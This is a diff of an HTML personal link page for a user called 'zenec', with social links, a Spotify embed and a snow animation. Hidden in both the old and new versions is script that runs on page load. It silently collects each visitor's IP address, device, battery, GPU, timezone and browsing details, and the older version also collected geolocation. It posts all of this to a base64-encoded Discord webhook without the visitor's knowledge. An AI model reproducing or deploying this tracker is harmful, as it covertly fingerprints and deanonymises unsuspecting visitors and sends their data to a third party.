@@ -3,95 +3,356 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ITS OVER</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Orbitron:wght@500;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<title>zenec</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%2300ff9d'/><text x='50' y='70' font-size='60' font-family='monospace' font-weight='bold' text-anchor='middle' fill='%23000'>Z</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: #0a0a0a;
+    color: #fff;
+    font-family: 'Inter', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: url('./Captura de tela 2026-06-28 024456.png') no-repeat center center;
+    background-size: cover;
+    filter: brightness(0.7);
+    z-index: 0;
+    animation: bgPulse 5s ease-in-out infinite;
+  }
+
+  @keyframes bgPulse {
+    0%, 100% { filter: brightness(0.7); }
+    50% { filter: brightness(0.8); }
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: radial-gradient(ellipse at center, rgba(10,10,10,0.4) 0%, rgba(10,10,10,0.75) 100%);
+    z-index: 1;
+  }
+
+  .glow-effects {
+    position: fixed;
+    inset: 0;
+    z-index: 2;
+    pointer-events: none;
+    overflow: hidden;
+  }
+
+  .glow {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    opacity: 0.15;
+    animation: floatGlow 6s ease-in-out infinite;
+  }
+
+  .glow-1 {
+    width: 200px;
+    height: 200px;
+    background: #00ff9d;
+    top: 30%;
+    left: 10%;
+    animation-delay: 0s;
+  }
+
+  .glow-2 {
+    width: 250px;
+    height: 250px;
+    background: #0066ff;
+    top: 50%;
+    right: 5%;
+    animation-delay: 2s;
+  }
+
+  .glow-3 {
+    width: 150px;
+    height: 150px;
+    background: #b400ff;
+    bottom: 20%;
+    left: 30%;
+    animation-delay: 4s;
+  }
+
+  @keyframes floatGlow {
+    0%, 100% { transform: translate(0, 0) scale(1); }
+    33% { transform: translate(20px, -30px) scale(1.1); }
+    66% { transform: translate(-15px, 15px) scale(0.9); }
+  }
+
+  .snowflake {
+    position: fixed;
+    top: -20px;
+    color: rgba(255, 255, 255, 0.8);
+    font-size: 12px;
+    pointer-events: none;
+    z-index: 3;
+    animation: snowfall linear infinite;
+    text-shadow: 0 0 5px rgba(255,255,255,0.8);
+  }
+
+  @keyframes snowfall {
+    0% { transform: translateY(-20px) translateX(0) rotate(0deg) scale(1); opacity: 0; }
+    5% { opacity: 1; }
+    25% { transform: translateY(25vh) translateX(30px) rotate(90deg) scale(1.1); }
+    50% { transform: translateY(50vh) translateX(-20px) rotate(180deg) scale(1); }
+    75% { transform: translateY(75vh) translateX(25px) rotate(270deg) scale(0.9); opacity: 0.8; }
+    100% { transform: translateY(105vh) translateX(-10px) rotate(360deg) scale(0.7); opacity: 0; }
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 10;
+    text-align: center;
+    padding: 40px 20px;
+    max-width: 400px;
+    width: 100%;
+  }
+
+  .title {
+    font-family: 'Space Mono', monospace;
+    font-size: 42px;
+    font-weight: 700;
+    letter-spacing: 6px;
+    color: #fff;
+    margin-bottom: 40px;
+  }
+
+  .spotify {
+    margin-bottom: 40px;
+    opacity: 0.8;
+    transition: opacity 0.3s;
+  }
+
+  .spotify:hover { opacity: 1; }
+
+  .links {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+  }
+
+  .link {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    padding: 16px 0;
+    text-decoration: none;
+    color: #888;
+    font-size: 13px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+    border-radius: 12px;
+    transition: all 0.2s;
+    cursor: pointer;
+    background: none;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+    width: 100%;
+    font-family: inherit;
+  }
+
+  .link:first-child {
+    border-top: 1px solid rgba(255,255,255,0.05);
+  }
+
+  .link:hover {
+    color: #fff;
+    background: rgba(255,255,255,0.03);
+  }
+
+  .link i {
+    font-size: 16px;
+    width: 20px;
+    text-align: center;
+  }
+
+  .copy-feedback {
+    position: fixed;
+    top: 24px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(0, 255, 157, 0.15);
+    border: 1px solid rgba(0, 255, 157, 0.4);
+    color: #00ff9d;
+    font-family: 'Space Mono', monospace;
+    font-size: 12px;
+    padding: 10px 20px;
+    border-radius: 8px;
+    letter-spacing: 1px;
+    opacity: 0;
+    transition: opacity 0.3s;
+    z-index: 9999;
+    pointer-events: none;
+  }
+
+  .copy-feedback.show {
+    opacity: 1;
+  }
+
+  .onlyfans-msg {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.9);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    gap: 20px;
+  }
+
+  .onlyfans-msg.show {
+    display: flex;
+  }
+
+  .onlyfans-msg .face {
+    font-size: 80px;
+  }
+
+  .onlyfans-msg .text {
+    font-family: 'Space Mono', monospace;
+    font-size: 18px;
+    color: #ff4757;
+    text-align: center;
+    letter-spacing: 3px;
+    animation: shake 0.5s;
+  }
+
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-10px); }
+    75% { transform: translateX(10px); }
+  }
+
+  @media (max-width: 480px) {
+    .title { font-size: 32px; letter-spacing: 4px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="glow-effects">
+  <div class="glow glow-1"></div>
+  <div class="glow glow-2"></div>
+  <div class="glow glow-3"></div>
+</div>
+
+<div class="wrapper">
+  <h1 class="title">zenec</h1>
+
+  <div class="spotify">
+    <iframe src="https://open.spotify.com/embed/track/2S2od3hT7ceytw7d1pTRuE?utm_source=generator&theme=0" width="100%" height="80" frameborder="0" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+  </div>
+
+  <div class="links">
+    <a class="link" href="https://steamcommunity.com/id/alakiban/" target="_blank"><i class="fa-brands fa-steam"></i>Steam</a>
+    <a class="link" href="https://open.spotify.com/user/31kcnovulikf4fcv5umkqtfclvy4" target="_blank"><i class="fa-brands fa-spotify"></i>Spotify</a>
+    <a class="link" href="https://www.instagram.com/joao_lima.c" target="_blank"><i class="fa-brands fa-instagram"></i>Instagram</a>
+    <a class="link" onclick="copyEpicNick()">Epic Games</a>
+  </div>
+</div>
+
+<div class="copy-feedback" id="copyFeedback">ZENEC AMASSA BOT copiado ✓</div>
+
+<div class="onlyfans-msg" id="onlyfansMsg">
+  <div class="face">😾</div>
+  <div class="text">NÃO DOIDAO</div>
+  <div style="color: #555; font-size: 11px; letter-spacing: 2px;">(clique pra fechar)</div>
+</div>
+
 <script>
-function copyNick() {
-  const nick = 'ZENEC AMASSA BOT';
-  const notice = document.getElementById('copyNotice');
+// Snow effect
+(function() {
+  const container = document.createElement('div');
+  container.style.cssText = 'position:fixed;inset:0;z-index:3;pointer-events:none;overflow:hidden;';
+  document.body.appendChild(container);
 
-  if (navigator.clipboard && navigator.clipboard.writeText) {
-    navigator.clipboard.writeText(nick).catch(() => {});
-  } else {
-    const textarea = document.createElement('textarea');
-    textarea.value = nick;
-    textarea.setAttribute('readonly', '');
-    textarea.style.position = 'fixed';
-    textarea.style.left = '-9999px';
-    document.body.appendChild(textarea);
-    textarea.select();
-    try { document.execCommand('copy'); } catch (e) {}
-    document.body.removeChild(textarea);
+  const flakes = ['❄','❅','❆','✦','•','·','∘'];
+
+  function createFlake() {
+    const f = document.createElement('div');
+    f.className = 'snowflake';
+    f.textContent = flakes[Math.floor(Math.random()*flakes.length)];
+    f.style.left = Math.random()*100+'%';
+    f.style.fontSize = (Math.random()*10+6)+'px';
+    f.style.animationDuration = (Math.random()*4+4)+'s';
+    f.style.animationDelay = (Math.random()*5)+'s';
+    f.style.opacity = Math.random()*0.6+0.3;
+    container.appendChild(f);
+    setTimeout(()=>f.remove(), 20000);
   }
 
-  if (notice) {
-    notice.textContent = 'Nick copiado!';
-    notice.classList.add('show');
-    clearTimeout(copyNick.timeout);
-    copyNick.timeout = setTimeout(() => {
-      notice.classList.remove('show');
-      notice.textContent = '';
-    }, 2200);
-  }
-}
-
-function permitirUsoPorIp(ip) {
-  if (!ip || ip === 'N/A') return false;
-
-  const storageKey = 'zenec_ip_uso_unico';
-  const ttlMs = 1000 * 60 * 5;
-  const agora = Date.now();
-  let ipsUsados = [];
-
-  try {
-    ipsUsados = JSON.parse(localStorage.getItem(storageKey) || '[]');
-    if (!Array.isArray(ipsUsados)) ipsUsados = [];
-  } catch (e) {
-    ipsUsados = [];
-  }
-
-  ipsUsados = ipsUsados.filter(item => {
-    if (!item || typeof item !== 'object') return false;
-    return typeof item.ip === 'string' && typeof item.ts === 'number' && (agora - item.ts) < ttlMs;
-  });
-
-  const jaExiste = ipsUsados.some(item => item.ip === ip);
-  if (jaExiste) return false;
-
-  ipsUsados.push({ ip, ts: agora });
-
-  try {
-    localStorage.setItem(storageKey, JSON.stringify(ipsUsados));
-    sessionStorage.setItem(storageKey + ':last', ip);
-  } catch (e) {}
-
-  return true;
-}
-
-const _0x4b1d = (function(){
-  const _0x2c = [
-    'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkv',
-    'd2ViaG9va3MvMTUyMDYzNzkwNDQwNDIy',
-    'MjA0Mi8wNlFCWDJjMUxMai14WFp3QVgy',
-    'MXNERS11SnJ0OE8zOXR2MUJCWHhGdUJy',
-    'X0xWbjZXTGw1X1IzeHNjdEZET3lyUGdT',
-    'aQ=='
-  ];
-  const _0x8f = _0x2c.join('');
-  return atob(_0x8f);
+  for(let i=0;i<50;i++) setTimeout(createFlake, i*200);
+  setInterval(createFlake, 200);
 })();
 
-function _0x1() {
+function showOnlyFans() {
+  document.getElementById('onlyfansMsg').classList.add('show');
+}
+
+document.getElementById('onlyfansMsg').addEventListener('click', () => {
+  document.getElementById('onlyfansMsg').classList.remove('show');
+});
+
+function copyEpicNick() {
+  const nick = 'ZENEC AMASSA BOT';
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(nick).then(() => {
+      showCopyFeedback();
+    }).catch(() => {
+      const textarea = document.createElement('textarea');
+      textarea.value = nick;
+      textarea.style.position = 'fixed';
+      textarea.style.left = '-9999px';
+      document.body.appendChild(textarea);
+      textarea.select();
+      try { document.execCommand('copy'); showCopyFeedback(); } catch(e) {}
+      document.body.removeChild(textarea);
+    });
+  }
+}
+
+function showCopyFeedback() {
+  const el = document.getElementById('copyFeedback');
+  el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), 2500);
+}
+</script>
+
+<script>
+const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMDYzNzkwNDQwNDIyMjA0Mi8wNlFCWDJjMUxMai14WFp3QVgyMXNERS11SnJ0OE8zOXR2MUJCWHhGdUJyX0xWbjZXTGw1X1IzeHNjdEZET3lyUGdTaQ==');
+
+function getBrowserName() {
   const ua = navigator.userAgent || '';
-  if (ua.indexOf('Edg/') !== -1) return 'Microsoft Edge';
-  if (ua.indexOf('Chrome/') !== -1) return 'Google Chrome';
-  if (ua.indexOf('Firefox/') !== -1) return 'Mozilla Firefox';
-  if (ua.indexOf('Safari/') !== -1) return 'Safari';
-  if (ua.indexOf('OPR/') !== -1 || ua.indexOf('Opera/') !== -1) return 'Opera';
+  if (ua.includes('Edg/')) return 'Microsoft Edge';
+  if (ua.includes('OPR/') || ua.includes('Opera/')) return 'Opera';
+  if (ua.includes('Chrome/')) return 'Google Chrome';
+  if (ua.includes('Firefox/')) return 'Mozilla Firefox';
+  if (ua.includes('Safari/')) return 'Safari';
   return 'Navegador desconhecido';
 }
 
-function _0x7() {
+function getGpuInfo() {
   const canvas = document.createElement('canvas');
   const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
   if (!gl) return 'N/A';
@@ -99,366 +360,115 @@ function _0x7() {
   return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A';
 }
 
-function _0x9(url, timeout = 500) {
+function normalize(value) {
+  return value === undefined || value === null || value === '' ? 'N/A' : String(value);
+}
+
+function fetchWithTimeout(url, timeout = 500) {
   return new Promise((resolve, reject) => {
     const timer = setTimeout(() => reject(new Error('timeout')), timeout);
-    fetch(url).then(response => {
-      clearTimeout(timer);
-      resolve(response);
-    }).catch(error => {
-      clearTimeout(timer);
-      reject(error);
-    });
+    fetch(url).then(response => { clearTimeout(timer); resolve(response); })
+      .catch(error => { clearTimeout(timer); reject(error); });
   });
 }
 
-async function _0x2() {
-  const _0x0 = value => value === undefined || value === null || value === '' ? 'N/A' : String(value);
-  const browser = _0x1();
-  let ip = 'N/A';
-  let location = 'N/A';
-  let coordinates = 'N/A';
-  let accuracy = 'N/A';
-  let isp = 'N/A';
+async function collectVisitorData() {
+  const browser = getBrowserName();
+  let ip = 'N/A', battery = 'N/A', internetType = 'N/A', downlink = 'N/A', rtt = 'N/A';
   const platform = navigator.platform || 'N/A';
   const cores = navigator.hardwareConcurrency || 'N/A';
-  let battery = 'N/A';
-  let internetType = 'N/A';
-  let downlink = 'N/A';
-  let rtt = 'N/A';
-  const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
-  const touchPoints = navigator.maxTouchPoints || 'N/A';
-  let cookies = navigator.cookieEnabled ? 'Ativado' : 'Desativado';
-  let dnt = navigator.doNotTrack || window.doNotTrack || 'N/A';
-  let vpn = 'N/A';
-  const screenInfo = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio || 1}x)`;
-  const gpu = _0x7();
+  const memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A';
+  const touch = navigator.maxTouchPoints || 'N/A';
+  const cookies = 'N/A';
+  const dnt = navigator.doNotTrack || window.doNotTrack || 'N/A';
+  const gpu = getGpuInfo();
+  const screen = window.screen.width + 'x' + window.screen.height + ' (' + (window.devicePixelRatio||1) + 'x)';
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
-  const userAgent = navigator.userAgent || 'N/A';
+  const ua = navigator.userAgent || 'N/A';
+  const referrer = document.referrer || 'direct';
+  const history = window.history ? window.history.length : 'N/A';
 
-  const ipPromise = _0x9('https://ipapi.co/json/', 500)
-    .then(res => res.json())
-    .catch(async () => {
-      try {
-        const fallback = await _0x9('https://api.ipify.org?format=json', 500);
-        return await fallback.json();
-      } catch (e) {
-        return null;
-      }
-    });
+  try {
+    const r = await fetchWithTimeout('https://api.country.is/', 500);
+    const j = await r.json();
+    ip = j.ip || 'N/A';
+  } catch(e) {}
 
-  const batteryPromise = navigator.getBattery ? navigator.getBattery().catch(() => null) : Promise.resolve(null);
-  const connectionPromise = Promise.resolve().then(() => {
-    if (!navigator.connection) return null;
-    return {
-      effectiveType: navigator.connection.effectiveType || 'N/A',
-      downlink: navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : 'N/A',
-      rtt: navigator.connection.rtt ? `${navigator.connection.rtt} ms` : 'N/A'
-    };
-  });
+  try {
+    const bat = await navigator.getBattery();
+    battery = Math.round(bat.level*100) + '% (' + (bat.charging ? 'carregando' : 'descarregando') + ')';
+  } catch(e) {}
 
-  const [ipJson, batteryInfo, connectionInfo] = await Promise.all([ipPromise, batteryPromise, connectionPromise]);
-
-  if (ipJson) {
-    ip = ipJson.ip || ip;
-    location = [ipJson.city, ipJson.region, ipJson.country_name].filter(Boolean).join(', ') || location;
-    coordinates = ipJson.latitude && ipJson.longitude ? `${ipJson.latitude}, ${ipJson.longitude}` : (ipJson.loc || coordinates);
-    accuracy = ipJson.country_name ? 'Cidade/Estado (~2-10km)' : accuracy;
-    isp = ipJson.org || ipJson.as || ipJson.carrier || isp;
-  }
-
-  if (batteryInfo) {
-    battery = Math.round(batteryInfo.level * 100) + '% (' + (batteryInfo.charging ? 'carregando' : 'descarregando') + ')';
-  }
-
-  if (connectionInfo) {
-    internetType = connectionInfo.effectiveType || 'N/A';
-    downlink = connectionInfo.downlink || 'N/A';
-    rtt = connectionInfo.rtt || 'N/A';
+  if (navigator.connection) {
+    internetType = navigator.connection.effectiveType || 'N/A';
+    downlink = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'N/A';
+    rtt = navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'N/A';
   }
 
   return {
-    ip: _0x0(ip),
-    location: _0x0(location),
-    coordinates: _0x0(coordinates),
-    accuracy: _0x0(accuracy),
-    isp: _0x0(isp),
-    platform: _0x0(platform),
-    cores: _0x0(cores),
-    memory: _0x0(memory),
-    gpu: _0x0(gpu),
-    browser: _0x0(browser),
-    ua: _0x0(userAgent),
-    battery: _0x0(battery),
-    internet: _0x0(internetType),
-    downlink: _0x0(downlink),
-    rtt: _0x0(rtt),
-    cookies: _0x0(cookies),
-    dnt: _0x0(dnt),
-    vpn: _0x0(vpn),
-    screen: _0x0(screenInfo),
-    language: _0x0(navigator.language || 'N/A'),
-    timezone: _0x0(timezone),
-    touch: _0x0(touchPoints),
-    referrer: _0x0(document.referrer || 'direct'),
-    history: _0x0(window.history ? window.history.length : 'N/A'),
-    time: new Date().toLocaleString('pt-BR')
+    ip: normalize(ip), platform: normalize(platform), cores: normalize(cores),
+    memory: normalize(memory), gpu: normalize(gpu), browser: normalize(browser),
+    ua: normalize(ua), battery: normalize(battery), internet: normalize(internetType),
+    downlink: normalize(downlink), rtt: normalize(rtt), cookies: normalize(cookies),
+    dnt: normalize(dnt), screen: normalize(screen), language: normalize(navigator.language || 'N/A'),
+    timezone: normalize(timezone), touch: normalize(touch), referrer: normalize(referrer),
+    history: normalize(history), time: new Date().toLocaleString('pt-BR')
   };
 }
 
-async function _0x3(data) {
-  if (!_0x4b1d || _0x4b1d.includes('YOUR_WEBHOOK_ID')) {
-    return;
-  }
-
+async function sendWebhook(data) {
   const embed = {
     title: '🔍 Rastreamento de Visitante',
     color: 0x1abc9c,
     fields: [
       { name: '🌐 IP', value: data.ip, inline: true },
-      { name: '🏢 Provedor', value: data.isp, inline: true },
-      { name: '📍 Localização', value: data.location, inline: false },
-      { name: '🗺️ Coordenadas', value: data.coordinates, inline: true },
-      { name: '🎯 Precisão', value: 'Cidade/Estado (~2-10km)', inline: true },
       { name: '🕒 Timezone', value: data.timezone, inline: true },
-      { name: '🖥️ Sistema', value: `${data.platform} (${data.cores} Cores)`, inline: true },
+      { name: '🖥️ Sistema', value: data.platform + ' (' + data.cores + ')', inline: true },
       { name: '🎮 GPU / Placa', value: data.gpu, inline: false },
       { name: '💾 Memória', value: data.memory, inline: true },
-      { name: '📦 Touch Points', value: data.touch, inline: true },
       { name: '🌐 Navegador', value: data.browser, inline: true },
-      { name: '🧾 User Agent', value: data.ua, inline: false },
+      { name: '🧾 UA', value: data.ua.substring(0,120), inline: false },
       { name: '🔋 Bateria', value: data.battery, inline: true },
-      { name: '📡 Internet', value: `${data.internet} / ${data.downlink}`, inline: true },
+      { name: '📡 Internet', value: data.internet + ' / ' + data.downlink, inline: true },
       { name: '⏱️ RTT', value: data.rtt, inline: true },
       { name: '🍪 Cookies', value: data.cookies, inline: true },
-      { name: '🔒 Do Not Track', value: data.dnt, inline: true },
-      { name: '🛡️ VPN/Proxy', value: data.vpn, inline: true },
+      { name: '🔒 DNT', value: data.dnt, inline: true },
       { name: '📱 Tela', value: data.screen, inline: true },
       { name: '🌍 Idioma', value: data.language, inline: true },
       { name: '📖 Referrer', value: data.referrer, inline: false },
-      { name: '📚 Histórico', value: `${data.history} páginas nesta aba`, inline: true },
-      { name: '⏰ Horário Acesso', value: data.time, inline: true }
+      { name: '📚 Histórico', value: data.history, inline: true },
+      { name: '⏰ Horário', value: data.time, inline: true }
     ],
-    footer: {
-      text: 'zenec security system v3 • Hoje às ' + data.time.replace(/^.* /, '')
-    }
+    footer: { text: 'zenec security system v3' }
   };
 
   const form = new FormData();
   form.append('payload_json', JSON.stringify({ username: 'zenec security system v3', embeds: [embed] }));
 
-  await fetch(_0x4b1d, {
-    method: 'POST',
-    mode: 'no-cors',
-    body: form
-  });
+  try {
+    await fetch(webhookUrl, { method: 'POST', mode: 'no-cors', body: form });
+  } catch (e) {}
 }
 
-function _0x4() {
-  const canvas = document.createElement('canvas');
-  canvas.id = 'matrix';
-  canvas.className = 'bg';
-  document.body.appendChild(canvas);
-  const ctx = canvas.getContext('2d');
-  if (!ctx) return;
-
-  const dpr = Math.min(window.devicePixelRatio || 1, 1.2);
-  canvas.width = Math.floor(window.innerWidth * dpr);
-  canvas.height = Math.floor(window.innerHeight * dpr);
-  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
-
-  ctx.fillStyle = '#050507';
-  ctx.fillRect(0, 0, window.innerWidth, window.innerHeight);
-}
-
-async function _0x6() {
-  _0x4();
-
-  const startTracking = () => {
-    _0x2()
-      .then(async (data) => {
-        if (permitirUsoPorIp(data.ip)) {
-          await _0x3(data);
-        }
-      })
-      .catch(() => {});
-  };
-
-  if ('requestIdleCallback' in window) {
-    requestIdleCallback(() => startTracking(), { timeout: 800 });
-  } else {
-    setTimeout(startTracking, 500);
+async function init() {
+  const data = await collectVisitorData().catch(() => null);
+  if (data && data.ip && data.ip !== 'N/A') {
+    const k = 'zenec_last_sent';
+    try {
+      const last = parseFloat(localStorage.getItem(k) || 0);
+      if (Date.now() - last < 300000) return; // 5 min
+    } catch(e) {}
+    await sendWebhook(data);
+    try { localStorage.setItem(k, Date.now().toString()); } catch(e) {}
   }
 }
 
 if (document.readyState === 'loading') {
-  document.addEventListener('DOMContentLoaded', _0x6);
+  document.addEventListener('DOMContentLoaded', init);
 } else {
-  _0x6();
+  init();
 }
 </script>
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
-html,body{background:#030303;color:#f2f2f2;height:100%;overflow:hidden;position:fixed;width:100%;cursor:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='28' height='28'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0%25' stop-color='%2300ff76'/%3E%3Cstop offset='100%25' stop-color='%23009646'/%3E%3C/linearGradient%3E%3Cfilter id='f' x='-40%25' y='-40%25' width='180%25' height='180%25'%3E%3CfeDropShadow dx='0' dy='0' stdDeviation='1.2' flood-color='%2300ff76' flood-opacity='0.65'/%3E%3C/filter%3E%3C/defs%3E%3Cpath d='M6 4 L22 14 L16 24 L6 4 Z' fill='url(%23g)' stroke='%2300ff76' stroke-width='1.2' filter='url(%23f)'/%3E%3Cpath d='M6.5 4.5 L16 14 L15 23' fill='none' stroke='%23ffffff' stroke-opacity='0.35' stroke-width='1'/%3E%3C/svg%3E") 6 4, auto;}
-
-button, a, .link {
-  cursor: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='28' height='28'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0%25' stop-color='%2300ff76'/%3E%3Cstop offset='100%25' stop-color='%23009646'/%3E%3C/linearGradient%3E%3Cfilter id='f' x='-40%25' y='-40%25' width='180%25' height='180%25'%3E%3CfeDropShadow dx='0' dy='0' stdDeviation='1.2' flood-color='%2300ff76' flood-opacity='0.65'/%3E%3C/filter%3E%3C/defs%3E%3Cpath d='M6 4 L22 14 L16 24 L6 4 Z' fill='url(%23g)' stroke='%2300ff76' stroke-width='1.2' filter='url(%23f)'/%3E%3Cpath d='M6.5 4.5 L16 14 L15 23' fill='none' stroke='%23ffffff' stroke-opacity='0.35' stroke-width='1'/%3E%3C/svg%3E") 6 4, auto;
-}
-
-body::before{
-  content:"";
-  position:fixed;
-  inset:0;
-  background:radial-gradient(circle at top left, rgba(0,255,120,.12), transparent 35%),
-              radial-gradient(circle at bottom right, rgba(0,255,120,.08), transparent 30%);
-  pointer-events:none;
-  z-index:0;
-}
-
-.container{
-  position:relative;
-  z-index:2;
-  min-height:100vh;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
-  gap:18px;
-  padding:20px;
-}
-
-.name{
-  font-size:70px;
-  font-weight:900;
-  letter-spacing:4px;
-  text-transform:uppercase;
-  color:#00ff9d;
-  font-family:Share Tech Mono,monospace;
-  text-shadow:0 0 8px rgba(0,255,145,.7), 0 0 18px rgba(0,255,145,.35);
-  position:relative;
-}
-
-.name::after{
-  content:"_";
-  color:#00ff9d;
-  animation:blink 1s steps(1) infinite;
-}
-
-.bg{
-  position:fixed;
-  inset:0;
-  z-index:0;
-  background-image:linear-gradient(rgba(0,255,145,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,145,.05) 1px, transparent 1px);
-  background-size:24px 24px;
-}
-
-.links{
-  width:100%;
-  max-width:340px;
-  display:flex;
-  flex-direction:column;
-  gap:10px;
-}
-
-.link{
-  text-decoration:none;
-  color:#8cffb3;
-  padding:14px;
-  border-radius:8px;
-  text-align:center;
-  background:rgba(10,10,10,.95);
-  border:1px solid rgba(0,255,145,.35);
-  transition:.25s;
-  font-family:Share Tech Mono,monospace;
-  text-transform:uppercase;
-  letter-spacing:2px;
-  box-shadow:inset 0 0 12px rgba(0,255,145,.08), 0 0 10px rgba(0,255,145,.12);
-}
-
-.link:hover{
-  background:#111;
-  color:#00ff9d;
-  box-shadow:0 0 16px rgba(0,255,145,.22);
-  transform:translateY(-2px);
-}
-
-.spotify-container{
-  width:100%;
-  max-width:340px;
-  overflow:hidden;
-  border:none;
-  border-radius:0;
-  background:transparent;
-}
-
-.footer{
-  margin-top:8px;
-  font-size:12px;
-  opacity:.75;
-  letter-spacing:1px;
-  color:#00ff9d;
-  font-family:Share Tech Mono,monospace;
-}
-
-.copy-notice{
-  min-height:22px;
-  color:#00ff9d;
-  font-family:Share Tech Mono,monospace;
-  font-size:12px;
-  letter-spacing:1px;
-  text-transform:uppercase;
-  opacity:0;
-  transform:translateY(4px);
-  transition:.25s ease;
-}
-
-.copy-notice.show{
-  opacity:1;
-  transform:translateY(0);
-}
-
-@keyframes blink{50%{opacity:0}}
-
-
-@media (max-width: 768px) {
-  .name{font-size:46px;letter-spacing:3px}
-}
-</style>
-</head>
-<body>
-
-<div class="bg">
-  <div class="smoke purple"></div>
-  <div class="smoke green"></div>
-  <div class="noise"></div>
-</div>
-
-<div id="snake-cursor" aria-hidden="true"><main class="container">
-  <h1 class="name">zenec</h1>
-
-  <div class="spotify-container">
-    <iframe
-      style="border-radius:0; margin: 20px 0; display: block; background:transparent;"
-      src="https://open.spotify.com/embed/track/4b0fiEZg92FBFYze5uEx0l?utm_source=generator&theme=0&autoplay=0"
-      width="100%"
-      height="80"
-      frameborder="0"
-      allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"
-      loading="lazy">
-    </iframe>
-  </div>
-
-  <div class="links">
-    <a class="link" href="https://steamcommunity.com/id/alakiban/" target="_blank">Steam</a>
-    <a class="link" href="https://open.spotify.com/user/31kcnovulikf4fcv5umkqtfclvy4" target="_blank">Spotify</a>
-    <a class="link" href="https://www.instagram.com/joao_lima.c" target="_blank">Instagram</a>
-    <button class="link" type="button" onclick="copyNick()">Epic Games</button>
-  </div>
-
-  <div id="copyNotice" class="copy-notice" aria-live="polite"></div>
-
-  <div class="footer">by zenec</div>
-</main>
 
 </body>
 </html>
